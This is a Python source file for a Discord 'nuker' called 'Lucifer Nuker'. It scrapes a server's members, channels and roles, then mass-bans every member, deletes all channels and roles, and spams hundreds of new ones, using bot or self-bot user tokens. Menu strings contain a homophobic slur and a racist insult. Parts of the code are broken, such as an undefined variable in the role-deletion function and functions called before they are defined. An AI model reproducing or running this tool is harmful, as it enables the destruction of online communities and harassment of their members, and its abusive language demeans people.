#this nuke tool was made by Lucifer ;) hope u enjoy.
import os
import sys
import threading
import time
import discord
import requests
import colorama
import random
import json
from discord.ext import commands
from colorama import Fore



os.system('Lucifer Nuker - Loading Nuker Panel...')
config = json.load(open('config.json'))

prefix = config["Setup"]["Prefix"]
token = config["Setup"]["Token"]
guild = config["Setup"]["Guild To Destroy"]

channel_names = config["SetupNuke-1"]["Channel Names"]
role_names = config["SetupNuke-1"]["Role Names"]


os.system("Lucifer Nuker - Loading Guild Info...")
members = open('Scraped Info/members.txt').read().split('\n')
channels = open('Scraped Info/channels.txt').read().split('\n')
roles = open('Scraped Info/roles.txt').read().split('\n')



os.system('\u001b[31mLucifer Nuker - Updating Version... Restart Program After Updating')
if discord.__version__ != '1.4.0' or discord.__version__ < '1.4.0':
    print(f"\u001b[31mInstalling discord.py 1.4...\n")
    os.system('pip install discord.py==1.4.0 > nul')
    cls()
    print(f"\u001b[31m Successfully Installed Version You May Now Restart The Program")
    time.sleep(2)
    os._exit(0)


def cls():
  if os.name == 'nt':
    os.system('cls')
  else:
    os.system('clear')


print(f"\x1b[38;5;196mLucifer Nuker Panel Is Ready!")
time.sleep(3)



def check_token(token: str) -> str:
    if requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token}).status_code == 200:
        return "user"
    else:
        return "bot"


token_type = check_token(token)

if token_type == "user":
    headers = {'Authorization': token}
    client = commands.Bot(
        command_prefix=prefix,
        case_insensitive=False,
        self_bot=True
    )

elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(
        command_prefix=prefix,
        case_insensitive=False
    )



def ban(i):
    r = requests.put(
        f"https://discord.com/api/v9/guilds/{guild}/bans/{i}",
        headers=headers
    )

    if r.status_code == 429:
        sys.stdout.write(f"\x1b[38;5;196m[Mass Ban Unsuccessful!] Sent Too Many Requests Retrying After {r.json()['retry_after']} Seconds\n")
        ban(i)

    elif r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        sys.stdout.write(f'\x1b[38;5;142m[Mass Ban] Successfully Banned {i}\n')


def chandel(u):
    r = requests.delete(
        f"https://discord.com/api/v9/channels/{u}",
        headers=headers
    )

    if r.status_code == 429:
        sys.stdout.write(f"\x1b[38;5;196m[Channel Deletion Unsuccessful!] Sent Too Many Requests Retrying After {r.json()['retry_after']} Seconds\n")
        chandel(u)

    elif r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        sys.stdout.write(f'\x1b[38;5;142m[Channel Deletetion] Successfully Deleted Channel {u}\n')
        

def roledel(r):
    r = requests.delete(
        f"https://discord.com/api/v9/guilds/{guild}/roles/{k}",
        headers=headers
    )

    if r.status_code == 429:
        sys.stdout.write(f"\x1b[38;5;196m[Role Deletion Unsuccessful!] Sent Too Many Requests Retrying After {r.json()['retry_after']} Seconds\n")
        roledel(k)
    elif r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        sys.stdout.write(f'\x1b[38;5;142m[Role Deletion] Successfully Deleted Role {k}\n')


def spamchannel(name):
    json = {
        'name': name,
        'type': 0
    }
    r = requests.post(
        f"https://discord.com/api/v9/guilds/{guild}/channels",
        headers=headers,
        json=json
    )
    if r.status_code == 429:
        sys.stdout.write(f"\x1b[38;5;196m[Mass Channel Spam Unsuccessful!] Sent Too Many Requests Retrying After; {r.json()['retry_after']} Seconds\n")
        spamchannel(name)
    elif r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        sys.stdout.write(f'\x1b[38;5;142m[Mass Channel Spam] Successfully Created {name}\n')


def spamrole(role):
    json = {'name': role, 'type': 0}
    r = requests.post(
        f"https://discord.com/api/v9/guilds/{guild}/roles",
        headers=headers, json=json
    )

    if r.status_code == 429:
        sys.stdout.write(f"\x1b[38;5;196m[Mass Role Spam Unsuccessful!] Sent Too Many Requests Retrying After; {r.json()['retry_after']} Seconds\n")
        spamrole(role)
    elif r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        sys.stdout.write(f'\x1b[38;5;142m[Mass Role Spam] Successfully Created Role {role}\n')


def nukecmd():
    cls()
    print(f"Successfully Nuking Guild!")
    for m in members:
        threading.Thread(target=ban, args=(m,)).start()

    for c in channels:
        threading.Thread(target=chandel, args=(c,)).start()

    for r in roles:
        threading.Thread(target=roledel, args=(r,)).start()

    for i in range(int(500)):
        threading.Thread(target=spamchannel, args=(random.choice(channel_names), )).start()

    for i in range(int(250)):
        threading.Thread(target=spamrole, args=(random.choice(role_names), )).start()

    sys.stdout.write('\x1b[38;5;142mFinished fucking server! Going back ;in 3 seconds\n')
    time.sleep(3)
    menu()

os.system('title Lucifer Nuker - Menu')

def menu():
    cls()
    print(f'''

{Fore.RED}

╭╮╱╱╱╱╱╱╱╱╱╱╭━╮
┃┃╱╱╱╱╱╱╱╱╱╱┃╭╯
┃┃╱╱╭╮╭┳━━┳┳╯╰┳━━┳━╮
┃┃╱╭┫┃┃┃╭━╋╋╮╭┫┃━┫╭╯
┃╰━╯┃╰╯┃╰━┫┃┃┃┃┃━┫┃
╰━━━┻━━┻━━┻╯╰╯╰━━┻╯
\x1b[38;5;142m[ 1 ] - Ban All Members
\x1b[38;5;142m[ 2 ] - Delete All Channels
\x1b[38;5;142m[ 3 ] - Delete All Roles
\x1b[38;5;142m[ 4 ] - Spam Channels
\x1b[38;5;142m[ 5 ] - Spam Roles
\x1b[38;5;142m[ 6 ] - Nuke Guild
\x1b[38;5;142m[ 7 ] - Credits
\x1b[38;5;142m[ 8 ] - Scrape
'''.center(os.get_terminal_size().columns))

    try:
        choice = int(input('[ > ]'))
    except:
        print('choose a correct input faggot!')
        time.sleep(3)
        menu()

    if choice == 1:
        cls()
        os.system(f'Lucifer Nuker - Banning members')
        print("\x1b[38;5;142maLucifer Nuker: Starting to Ban Members")
        for m in members:
            threading.Thread(target=ban, args=(m, )).start()
        sys.stdout.write('\x1b[38;5;172mFinished Banning All Members! Going back in 3 seconds\n')
        time.sleep(3)
        menu()


    elif choice == 2:
        cls()
        os.system(f'Lucifer Nuker - Deleting Channels')
        print("\x1b[38;5;142mPlayZ Nuker: Starting to Delete Channels")
        for c in channels:
            threading.Thread(target=chandel, args=(c, )).start()
        sys.stdout.write('\x1b[38;5;142mFinished Deleting All Channels! Going back in 3 seconds\n')
        time.sleep(3)
        menu()


    elif choice == 3:
        cls()
        os.system(f'Lucifer Nuker - Deleting Roles')
        print("\x1b[38;5;142mLucifer Nuker: Starting to Delete Roles")
        for r in roles:
            threading.Thread(target=roledel, args=(r, )).start()
        sys.stdout.write('\x1b[38;5;142mFinished Deleting All Roles! Going back in 3 seconds\n')
        time.sleep(3)
        menu()


    elif choice == 4:
        cls()
        os.system('Lucifer Nuker - Create Channels')
        print("\x1b[38;5;142mLucifer Nuker: Starting to Create Channels\n")
        print(f"\x1b[38;5;142mChannel Names Loaded From Configuration Settings")
        amount = input(f"\x1b[38;5;142mAmount Of Channels To Spam: ")
        for i in range(int(amount)):
            threading.Thread(target=spamchannel, args=(random.choice(channel_names), )).start()
        sys.stdout.write('\x1b[38;5;142mFinished Creating All Channels! Going back in 3 seconds\n')
        time.sleep(3)
        menu()


    elif choice == 5:
        cls()
        os.system(f'Lucifer Nuker - Create Mass Roles')
        print("\x1b[38;5;142mLucifer Nuker: Starting to Create Roles")
        print("\x1b[38;5;142mRole Names Loaded From Configuration Settings")
        amount = input(f"\x1b[38;5;142mAmount Of Roles To Create:")
        for i in range(int(amount)):
            threading.Thread(target=spamrole, args=(random.choice(role_names), )).start()
        sys.stdout.write('\x1b[38;5;142mFinished Creating All Roles! Going back in 3 seconds\n')
        time.sleep(3)
        menu()


    elif choice == 6:
      cls()
      os.system('title Lucifer Nuker - Nuking')
      nukecmd()

    elif choice == 7:
        cls()
        print("\x1b[38;5;142mThis Nuker was made by Lucifer! Hope you love it!")
        input("\x1b[38;5;142mPress Enter To Go Back To The Nuker Panel.\n")
        menu()

    elif choice == 8:
        print(f'Type {prefix}scrape in any channel of the guild to scrape info!')
    
    elif choice == 9:
        cls()
        print("youre a fat negro")
        input("Press Enter To Go Back To The Nuker Panel")
        menu()

    else:
        print('Invalid choice!')
        time.sleep(3)
        menu()

@client.command()
async def scrape(ctx):
    await ctx.message.delete()
    membercount = 0
    channelcount = 0
    rolecount = 0

    try:
        os.remove("Scraped Info/members.txt")
        os.remove("Scraped Info/channels.txt")
        os.remove("Scraped Info/roles.txt")
    except:
        pass

    with open('Scraped Info/members.txt', 'a') as f:
        ctx.guild.members
        for member in ctx.guild.members:
            f.write(str(member.id) + "\n")
            membercount += 1
        print(f"\x1b[38;5;142mScraped {membercount} Members")

    with open('Scraped Info/channels.txt', 'a') as f:
        ctx.guild.channels
        for channel in ctx.guild.channels:
            f.write(str(channel.id) + "\n")
            channelcount += 1
        print(f"\x1b[38;5;142mScraped {channelcount} Channels")

    with open('Scraped Info/roles.txt', 'a') as f:
        ctx.guild.roles
        for role in ctx.guild.roles:
            f.write(str(role.id) + "\n")
            rolecount += 1
        print(f"\x1b[38;5;142mScraped {rolecount} Roles")
        print(f"Finished Scraping Guild!")
    
    
    sys.stdout.write('\x1b[38;5;142mRestart The Program To Apply Changes. (If you dont, certain commands wont work!)\n')
    time.sleep(100)
    menu()
    

@client.event
async def on_ready():
    if token_type == "bot":
        menu()


@client.event
async def on_connect():
    if token_type == "user":
        menu()


@client.event
async def on_command_error(ctx, error):
    return


try:
    cls()
    if token_type == "user":
        client.run(token, bot=False)
    elif token_type == "bot":
        client.run(token)
except:
    print(f"\u001b[31m Invalid Token! (token might be rate-limited! or a repl.it glitch! try restarting the program or get a new token!)")
    
